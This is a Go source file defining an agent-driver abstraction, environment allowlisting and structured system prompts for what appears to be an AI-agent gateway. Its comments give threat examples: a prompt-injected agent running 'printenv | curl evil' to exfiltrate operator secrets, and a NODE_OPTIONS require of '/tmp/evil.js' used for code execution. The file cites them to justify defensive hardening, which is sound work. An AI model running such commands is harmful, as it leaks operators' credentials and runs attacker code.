// Package agent defines the agent-driver abstraction that replaces the
// claude-agent-sdk binding. Each agent (Claude, Codex, Gemini, …) is driven by
// spawning its CLI / app-server and normalizing its output into a single
// AgentEvent stream. The rest of the gateway (router, session-store, cron,
// stream-relay) depends only on this package — never on a specific agent.
package agent

import (
	"context"
	"os"
	"strings"
)

// envAllowlist is the operator-environment subset the agent subprocess
// needs to function. Anything outside the list is dropped before the
// child sees it.
//
// Why allowlist not pass-through: `claude` runs with broad tool access
// and a prompt-injected agent can `printenv | curl evil`. The daemon's
// own `os.Environ` carries every `AWS_*`, `GH_TOKEN`, `OPENAI_API_KEY`,
// `SSH_AUTH_SOCK`, etc., from the operator's shell — handing that to a
// process running attacker-controlled instructions is a leak. Per-bot
// env (ANTHROPIC_*, OCTO_*, CLAUDE_CONFIG_DIR, …) flows through the
// `extra` parameter, never via inheritance. The default is fail-closed.
var envAllowlist = map[string]struct{}{
	"HOME":          {}, // ~/.claude lookups, ~/.npmrc, etc.
	"USER":          {}, // some CLIs read it for prompts/log lines
	"LOGNAME":       {}, // POSIX alias for USER
	"PATH":          {}, // resolve `node`, `git`, `claude`, etc.
	"TMPDIR":        {}, // child writes scratch files
	"TMP":           {}, // Windows analogue
	"TEMP":          {}, // Windows analogue
	"LANG":          {}, // locale; affects message formatting
	"LC_ALL":        {}, // locale override
	"LC_CTYPE":      {}, // locale subset commonly set on macOS
	"TZ":            {}, // time zone
	"TERM":          {}, // some CLIs check before printing ANSI
	"SSL_CERT_FILE": {}, // CA bundle override
	"SSL_CERT_DIR":  {}, // CA bundle override
	"NODE_PATH":     {}, // node module resolution for claude
	// NOTE: NODE_OPTIONS was deliberately REMOVED in — it's an
	// RCE pass-through. `NODE_OPTIONS=--require=/tmp/evil.js` executes
	// arbitrary JS in the claude child at startup, same category as the
	// SHELL drop in but executable. Operators who genuinely need a
	// node flag set per bot can supply it via `agent.env`, which flows
	// through `extra` (and is reviewed at config-edit time), not via the
	// inherited operator environment.
	"NPM_CONFIG_PREFIX": {}, // npm-installed claude lookups
	// Corporate proxies — universally honored by node, curl, and the
	// Anthropic SDK. NOT secrets; dropping them silently breaks claude
	// connectivity in any proxied enterprise environment.
	"HTTP_PROXY":  {},
	"HTTPS_PROXY": {},
	"NO_PROXY":    {},
	"http_proxy":  {},
	"https_proxy": {},
	"no_proxy":    {},
}

// mergedEnv returns the agent's spawn environment: the allowlisted subset of
// the daemon's os.Environ with `extra` (KEY=VALUE entries) layered on top,
// later entries winning so callers put overrides (e.g. ANTHROPIC_BASE_URL)
// last. See envAllowlist for why pass-through was retired.
//
// Variables starting with LC_ are auto-included (POSIX locale family).
// A nil/empty extra returns just the allowlisted base.
func mergedEnv(extra []string) []string {
	base := os.Environ()
	out := make([]string, 0, len(base)+len(extra))
	for _, e := range base {
		eq := strings.IndexByte(e, '=')
		if eq <= 0 {
			continue
		}
		k := e[:eq]
		if _, ok := envAllowlist[k]; ok || strings.HasPrefix(k, "LC_") {
			out = append(out, e)
		}
	}
	out = append(out, extra...)
	return out
}

// EventKind classifies a normalized agent event.
type EventKind string

const (
	KindSessionStarted EventKind = "session_started" // carries a SessionID for resume
	KindTextDelta      EventKind = "text_delta"      // a chunk of assistant text
	KindThinking       EventKind = "thinking"        // extended-thinking text (optional)
	KindToolUse        EventKind = "tool_use"        // the agent invoked a tool
	KindToolResult     EventKind = "tool_result"     // a tool returned
	KindTurnDone       EventKind = "turn_done"       // the turn completed (carries usage)
	KindError          EventKind = "error"           // recoverable or terminal error
	KindSystem         EventKind = "system"          // init / retry / hook — informational
)

// AgentEvent is the single normalized currency between any driver and the
// gateway. Drivers translate their agent's native protocol into these.
//
// AgentEvent has NO JSON tags by design: it never crosses a wire boundary.
// The control bus uses the camelCase types in core/control/wire (mapped from
// AgentEvent in control/sink.go), and the IM connector reads typed Go fields
// directly. Adding json tags here would advertise a contract this struct
// doesn't own (and the snake_case style would diverge from the wire's
// camelCase).
type AgentEvent struct {
	Kind EventKind

	// Text carries assistant/thinking text for KindTextDelta / KindThinking.
	// The driver emits one event per complete content block (plain stream-json,
	// no token-level partials), so consumers append text without de-duplication.
	Text string

	// SessionID is set on KindSessionStarted (used to resume next turn).
	SessionID string

	// Tool fields for KindToolUse / KindToolResult.
	ToolName   string
	ToolParams string // truncated one-liner — consumed by the IM tool-progress notice + CLI
	// ToolSummary / ToolDetail feed the desktop step card: Summary is a
	// human-readable one-liner (the tool input's "description", else
	// Name(params)); Detail is the raw "Name(params)" shown when a step is
	// expanded. Computed once in claude_parse so the live + persisted paths
	// carry identical text.
	ToolSummary string
	ToolDetail  string

	// Usage on KindTurnDone.
	Usage *TokenUsage

	// Err on KindError.
	Err         string
	Recoverable bool
	// ResumeInvalid marks a KindError caused by an unknown/stale resume id (the
	// agent's stored session no longer exists, e.g. after the config dir
	// changed). The gateway clears the resume mapping and retries fresh.
	ResumeInvalid bool
	// Transient marks a KindError caused by an upstream rate-limit / overload /
	// usage-cap condition (HTTP 429/503/529, "overloaded", "usage limit
	// reached", …) rather than a bug in the turn. The gateway surfaces a
	// distinct "服务繁忙" reply for these so the user knows to retry later.
	// RetryHint carries the human-readable reset window the agent reported
	// ("resets at 3pm"), when one was present.
	Transient bool
	RetryHint string

	// Raw holds the original line for debugging / forward-compat.
	Raw string
}

// TokenUsage is the per-turn token accounting, when the agent reports it.
// Like AgentEvent, this carries no JSON tags — accounting flows out via
// store.AddUsage + wire.UsageBody, not via direct serialization.
type TokenUsage struct {
	InputTokens  int
	OutputTokens int
	// CachedInputTokens is the portion of InputTokens served (read) from the
	// prompt cache (claude's cache_read_input_tokens) — cheap, cache hits.
	CachedInputTokens int
	// CacheCreationInputTokens is the input written into the prompt cache this
	// turn (claude's cache_creation_input_tokens) — cache writes, distinct from
	// reads (a write seeds the cache; a later read serves from it).
	CacheCreationInputTokens int
	// CostUSD is the agent-reported turn cost (claude's total_cost_usd). Zero
	// when unreported (e.g. subscription auth that omits cost).
	CostUSD float64
}

// SystemPrompt carries the SEMANTIC ROLE of each system-prompt segment, not a
// flattened blob. Each driver decides how to map these onto its own CLI flags,
// but every driver MUST honor one invariant: Mandatory leads Persona and can
// never be displaced by the agent's built-in base prompt. Escaping of untrusted
// content (the Background segments) is the caller's job (the gateway, via the
// safety package) — this leaf type only receives already-safe strings, keeping
// agent dependency-free (same philosophy as AgentEvent: no wire deps).
//
// Why this exists: a single flattened string loses the distinction between
// "non-overridable security prefix", "operator-trusted persona", and "untrusted
// background". ClaudeDriver could work with a blob only because the gateway
// implicitly knew Claude's flag behavior; a second driver (Codex/Gemini) cannot
// recover those roles from a blob. Structuring the intent keeps the security
// contract enforceable across drivers.
type SystemPrompt struct {
	// Mandatory is the non-overridable security prefix. It must appear first in
	// the final prompt and must not be displaced by the agent's base prompt.
	Mandatory string
	// Persona is the operator-trusted persona/behavior (SOUL.md + AGENTS.md +
	// group roster + persona-clone + bootstrap). A driver may append these on top
	// of its base prompt or use them to replace it.
	Persona []string
	// Background is untrusted, already-escaped context (the per-group GROUP.md
	// handbook). A driver should keep it after the trusted segments.
	Background []string
}

// Flatten joins the segments in Mandatory → Persona → Background order with a
// blank line between non-empty parts. Drivers that take a single system-prompt
// string call this; structure-aware drivers read the fields directly.
func (p SystemPrompt) Flatten() string {
	parts := make([]string, 0, 1+len(p.Persona)+len(p.Background))
	if p.Mandatory != "" {
		parts = append(parts, p.Mandatory)
	}
	for _, s := range p.Persona {
		if s != "" {
			parts = append(parts, s)
		}
	}
	for _, s := range p.Background {
		if s != "" {
			parts = append(parts, s)
		}
	}
	return strings.Join(parts, "\n\n")
}

// IsZero reports whether every segment is empty — i.e. Flatten would return "".
func (p SystemPrompt) IsZero() bool {
	if p.Mandatory != "" {
		return false
	}
	for _, s := range p.Persona {
		if s != "" {
			return false
		}
	}
	for _, s := range p.Background {
		if s != "" {
			return false
		}
	}
	return true
}

// Request is the agent-agnostic ask. Drivers map these onto their CLI
// flags.
type Request struct {
	Prompt    string
	SessionID string // "" = new session; non-empty = resume
	Cwd       string // sandbox working directory
	MemoryDir string // per-session auto-memory dir ("" = driver default)
	Model     string // optional model override

	// System is the structured system-prompt intent (Mandatory / Persona /
	// Background) the gateway assembles. Drivers map the segments onto their own
	// CLI flags but MUST keep Mandatory first and non-overridable; see the
	// SystemPrompt type doc. A claude-style driver that takes a single string
	// calls System.Flatten().
	System SystemPrompt

	// AllowedTools scopes the tools the agent may call.
	//   nil          → driver default whitelist
	//   empty slice  → no tools (model has zero surface)
	//   non-empty    → exact list
	// The driver maps to its own flag (e.g. `--tools <names>` for claude).
	AllowedTools []string

	// SettingSources selects which filesystem setting scopes the driver
	// loads. Values are driver-specific scope
	// names (claude: "user", "project"). Empty → driver default ("user"
	// for claude). The driver maps to its own flag (`--setting-sources`).
	SettingSources []string
}

// Capabilities advertises what a driver supports, so the gateway can adapt.
type Capabilities struct {
	Streaming  bool
	Resume     bool
	ToolEvents bool
}

// Driver is the contract every agent adapter implements. Query spawns the
// agent for one turn and streams normalized events until the channel closes.
//
// Beyond this core trio, a driver MAY implement the capability interfaces below
// (EnvMapper, ConfigDirNamer, MCPProber, ToolProber). The cmd/desktop layers
// type-assert for them rather than for a concrete driver type, so a driver that
// has no MCP concept simply omits MCPProber and the MCP health-check degrades to
// "unsupported" instead of breaking compilation.
type Driver interface {
	Name() string
	Capabilities() Capabilities
	Query(ctx context.Context, req Request) (<-chan AgentEvent, error)
}

// EnvSpec is the driver-agnostic description of a bot's process environment.
// config produces it from neutral fields (it must not name ANTHROPIC_* or
// CLAUDE_CONFIG_DIR — config is a leaf that doesn't import agent); a driver's
// EnvMapper translates it into the concrete KEY=VALUE entries its CLI expects.
// This is the seam that lets the env-var contract vary per driver: Claude emits
// ANTHROPIC_BASE_URL/ANTHROPIC_AUTH_TOKEN/CLAUDE_CONFIG_DIR, a future driver
// emits its own names from the SAME spec.
type EnvSpec struct {
	// Extra are user-declared agent.env entries (already secret-resolved),
	// emitted FIRST so the named vars below win over a same-named entry.
	Extra []string
	// GatewayBaseURL / GatewayToken route the model API (Claude: ANTHROPIC_*).
	// Empty values are omitted.
	GatewayBaseURL string
	GatewayToken   string
	// OctoToken / OctoAPIURL are the octo-cli companion credential fallback
	// (OCTO_BOT_TOKEN / OCTO_API_BASE_URL — these are octo-cli's contract, not
	// the agent's, so every driver emits them identically). Empty → omitted.
	OctoToken  string
	OctoAPIURL string
	// ConfigDir is the per-bot isolated config root (Claude: CLAUDE_CONFIG_DIR).
	// Empty, or InheritUserConfig true, suppresses the isolation var so the
	// agent inherits the operator's user-scope config.
	ConfigDir         string
	InheritUserConfig bool
}

// mapEnvSpec is the shared EnvSpec→[]string projection every driver's EnvMapper
// uses: it emits the user agent.env first (so the named vars below win over a
// same-named entry), then the gateway routing pair under driver-specific names
// (baseURLVar/authTokenVar), then the octo-cli companion fallback (identical
// across drivers — octo-cli's contract, not the agent's), then the per-bot
// config-dir isolation var (configDirVar), suppressed when unset or inheriting.
// Empty values are omitted. Centralizing this keeps the ordering + omission
// rules — pinned by TestClaudeEnvMapperContract — identical across drivers, so a
// new driver only supplies its three var names.
func mapEnvSpec(spec EnvSpec, baseURLVar, authTokenVar, configDirVar string) []string {
	out := append([]string(nil), spec.Extra...)
	if spec.GatewayBaseURL != "" {
		out = append(out, baseURLVar+"="+spec.GatewayBaseURL)
	}
	if spec.GatewayToken != "" {
		out = append(out, authTokenVar+"="+spec.GatewayToken)
	}
	if spec.OctoToken != "" {
		out = append(out, "OCTO_BOT_TOKEN="+spec.OctoToken)
	}
	if spec.OctoAPIURL != "" {
		out = append(out, "OCTO_API_BASE_URL="+spec.OctoAPIURL)
	}
	if spec.ConfigDir != "" && !spec.InheritUserConfig {
		out = append(out, configDirVar+"="+spec.ConfigDir)
	}
	return out
}

// EnvMapper maps a neutral EnvSpec onto the concrete env-var names a driver's
// CLI consumes. Implemented by drivers; called by the cmd join-point (which
// imports both config and agent) to build Options.EnvFn.
type EnvMapper interface {
	Env(spec EnvSpec) []string
}

// ConfigDirNamer reports the per-bot config-directory base name a driver uses
// under the bot root (Claude: ".claude"). The daemon joins it with the bot root
// to form EnvSpec.ConfigDir and to mkdir it before spawn; the desktop joins it
// to locate skills/workflows/mcp config. Centralizing it here keeps core and
// desktop from drifting on the literal.
type ConfigDirNamer interface {
	ConfigDirName() string
}

// MCPProber is implemented by drivers that support MCP servers and can report
// per-server health (the desktop's "test connection"). Replaces the old
// drv.(*ClaudeDriver) reach-through in the daemon. cwd is the sandbox dir a real
// turn runs in; mcpPath is the bot's MCP config file.
type MCPProber interface {
	ProbeMCPConfig(ctx context.Context, cwd string, env []string, mcpPath string) ([]MCPServerStatus, error)
}

// ToolProber is implemented by drivers whose tool surface is discovered from
// the live binary (rather than a static list). The desktop's tool picker probes
// through this. ResolveBin exposes the per-turn binary so an out-of-turn probe
// uses the same executable a real Query would.
type ToolProber interface {
	ResolveBin() string
	ProbeToolNames(ctx context.Context, env []string) ([]string, error)
}
